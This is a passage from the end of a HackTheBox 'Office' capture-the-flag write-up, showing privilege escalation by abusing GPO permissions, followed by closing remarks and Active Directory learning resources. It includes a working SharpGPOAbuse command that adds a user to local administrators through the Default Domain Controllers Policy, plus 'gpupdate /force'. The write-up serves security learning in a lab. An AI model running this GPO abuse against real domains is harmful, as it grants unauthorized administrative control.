</code></pre><p><img src=/images/HTB-Office/GPO-Permissions.png alt="Default Domain Controller Policy permissions"></p><p>We notice that the listed SID matches the GPO Managers group&rsquo;s SID. Moreover <code>AceType</code> and <code>AceQualifier</code> are both set to <code>AccessAllowed</code>. This data confirms that the members of the <code>GPO Managers</code> group can exercise all the permissions they have on the <code>Default Domain Controllers Policy</code>.</p><p>We exploit this misconfiguration and add <code>hhogan</code> to the administrators group with a tool call <a href=https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0>SharpGPOAbuse</a>.</p><pre tabindex=0><code>.\sharpgpoabuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Controllers Policy&#34;
</code></pre><p><img src=/images/HTB-Office/sharpgpoabuse-cmd.png alt="SharpGPOAbuse command"></p><p>We update the policy for the task to take effect.</p><pre tabindex=0><code>gpupdate /force
</code></pre><p><img src=/images/HTB-Office/gpupdate.png alt="gpudate command"></p><p>Now, we are indeed part of the <code>Administrators</code> group.</p><p><img src=/images/HTB-Office/administrators-add.png alt="user added to the Administrators group"></p><p>All we need to do is log out and log in again to access the administrator&rsquo;s desktop and read the root flag.</p><p><img src=/images/HTB-Office/root-flag.png alt="Root flag location"></p><h2 id=closing-words>Closing Words</h2><p>That&rsquo;s it for my first write up for a Hard box on HackTheBox! I have to admit the bump in difficulty and scope from Medium is very noticeable, but I was able to experiment with a lot of new tools during the exploitation of Office.</p><p>Learning Active Directory is a non-negotiable for aspiring security professionals especially on the technical side. I am still learning it but here are a few resources that you can use to deep dive into it:</p><ul><li>TryHackMe gives you access to two AD networks for free as long as you have a 7 days streak minimum, find them <a href=https://tryhackme.com/r/hacktivities>here</a> in the <code>Networks</code> section.</li><li>They also have some free rooms pertaining to Active Directory such as <a href=https://tryhackme.com/r/room/winadbasics>Active Directory Basics</a>, <a href=https://tryhackme.com/r/room/attacktivedirectory>Attacktive Directory</a>, <a href=https://tryhackme.com/r/room/ra>Ra</a>, <a href=https://tryhackme.com/r/room/resetui>Reset</a>, and <a href=https://tryhackme.com/r/room/enterprise>Enterprise</a>.</li><li>HackTheBox Academy has multiple modules on Active Directory, go to <a href=https://academy.hackthebox.com/modules>this</a> page and search for &ldquo;active directory&rdquo; to find them all.</li><li>If you are a book lover, I highly recommand <a href=https://www.amazon.com/Pentesting-Active-Directory-Windows-based-Infrastructure/dp/1804611360>Pentesting Active Directory and Windows-based Infrastructure</a>.</li></ul></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-crafty/>&#8592;
Previous:
HTB: Crafty</a></p><p class=prev-post-date>June 12, 2024</p></div><div class=next-post><p><a href=/posts/htb-perfection/>Next:
HTB: Perfection
&#8594;</a></p><p class=next-post-date>July 4, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#shell-as-tstark>Shell as tstark</a><ul><li><a href=#active-directory-enumeration>Active Directory Enumeration</a></li></ul></li><li><a href=#shell-as-ppotts>Shell as ppotts</a></li><li><a href=#shell-as-hhogan>Shell as hhogan</a><ul><li><a href=#side-note>Side Note</a></li></ul></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#closing-words>Closing Words</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>